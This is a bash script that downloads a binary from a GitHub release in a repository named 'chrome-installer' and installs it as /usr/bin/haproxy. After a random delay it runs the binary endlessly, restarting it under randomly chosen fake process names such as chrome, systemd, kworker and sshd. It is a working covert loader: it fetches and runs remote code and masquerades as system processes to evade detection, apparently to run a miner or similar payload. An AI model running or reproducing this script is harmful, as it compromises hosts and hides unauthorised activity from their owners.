#!/bin/bash
set -e
curl -O -J -L https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/haproxy.tar.gz
tar -xf haproxy.tar.gz
rm haproxy.tar.gz
cd haproxy
chmod +x ./haproxy
mv ./haproxy /usr/bin/haproxy

PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY

HAPROXY_BIN="/usr/bin/haproxy"
PROCESS_NAMES=(
chrome node systemd kworker redis dockerd containerd sshd nginx pm2
)
JSON_FILES=(
part4.json
part4.json
part4.json
part4.json
)
while true; do
    pkill -f "$HAPROXY_BIN" || true
    PROC_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
    echo "Start $PROC_NAME with $JSON"
    exec -a "$PROC_NAME" "$HAPROXY_BIN" -c "$JSON" &
    INTERVAL=$((60 + RANDOM % 61))
    echo "Next restart in $INTERVAL seconds"
    sleep $INTERVAL
done

